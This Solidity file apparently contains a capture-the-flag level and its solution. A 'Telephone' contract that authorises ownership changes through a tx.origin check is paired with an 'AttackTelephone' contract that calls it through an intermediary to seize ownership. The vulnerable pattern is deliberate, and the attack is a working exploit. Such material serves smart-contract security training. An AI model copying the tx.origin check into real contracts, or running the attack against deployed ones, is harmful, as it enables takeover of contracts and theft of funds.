// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

pragma solidity ^0.8.0;

contract AttackTelephone {
    Telephone logic;

    constructor(address _logic) {
        logic = Telephone(_logic);
    }
    function attack() public {
        logic.changeOwner(msg.sender);
       
    }

}